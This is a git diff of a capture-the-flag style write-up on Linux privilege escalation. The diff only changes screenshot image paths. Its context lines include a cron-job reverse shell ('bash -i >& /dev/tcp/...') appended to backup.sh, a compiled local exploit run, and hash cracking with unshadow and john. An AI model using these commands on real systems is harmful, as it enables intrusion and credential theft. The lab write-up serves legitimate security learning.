@@ -78,7 +78,7 @@ chmod +x exploit
 whoami
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (2) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation: Sudo
 
@@ -90,7 +90,7 @@ whoami
 sudo -l
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>
 
 **What is the content of the flag2.txt file?**
 
@@ -221,7 +221,7 @@ cat /home/ubuntu/flag4.txt
 cat /etc/crontab
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -230,7 +230,7 @@ ls -lah /home/karen/backup.sh
 cat /home/karen/backup.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -245,7 +245,7 @@ chmod +x /home/karen/backup.sh
 echo "bash -i >& /dev/tcp/10.10.19.80/4444 0>&1" >> /home/karen/backup.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **What is Matt's password?**
 
@@ -265,7 +265,7 @@ unshadow passwd shadow > passwords.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18) (6).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation: PATH
 
@@ -285,7 +285,7 @@ find / -writable 2>/dev/null
 
 ****
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (6).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -308,7 +308,7 @@ cat /etc/exports
 
 <figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (11).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
